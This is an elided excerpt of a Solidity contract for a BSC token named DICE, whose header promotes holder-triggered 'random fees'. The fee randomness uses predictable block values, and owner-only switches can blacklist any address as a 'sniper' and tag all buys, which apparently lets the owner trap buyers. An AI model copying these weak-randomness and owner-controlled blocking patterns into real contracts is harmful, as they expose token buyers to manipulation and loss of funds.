...
/**
 ...
 From Mega Degen Plays.
 https://t.me/megadegen

 Tokenomics:

    Random fees: Every holder can change the taxes on bscscan at any given time.
    Throw the dice, new taxes. Have fun.

    Total supply: 1,000,000
    Max Tx and Wallet: 2% (20,000)
...
contract DICE is Ownable, IBEP20 {
    ...
    event NewTaxesSet(uint256 lp, uint256 mkt, uint256 total);
    ...
    constructor() {
        ...
        autoLiquidityReceiver = 0xE5e02d9F89E9124AA0F82e77868d2Bd4FAdd9173;
        marketingWallet = 0xE5e02d9F89E9124AA0F82e77868d2Bd4FAdd9173;
    ...
    function random2() public view returns(uint){
        return uint(keccak256(abi.encodePacked(block.difficulty,  
        msg.sender, block.timestamp))) % 25;
    }

    function setRandomFees() external payable {
        require(diceEnabled);
        uint exactAmount = 10000000000000000;
        require (msg.value >= exactAmount);
        payable(marketingWallet).transfer(msg.value);

        liquidityFee = random1();
        marketingFee = random2();

        totalFee = liquidityFee.add(marketingFee);
        totalFeeIfSelling = totalFee;

        emit NewTaxesSet(liquidityFee, marketingFee, totalFee);
    }

    function setDiceEnabled(bool dice) external onlyOwner {
        diceEnabled = dice;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isSniper[sender], "Taglisted");
    ...
    function setIsSniper(address holder, bool isASniper) external onlyOwner {
        isSniper[holder] = isASniper;
    }

	function setTagAllBuys(bool active) external onlyOwner {
		tagAllBuys = active;
	}
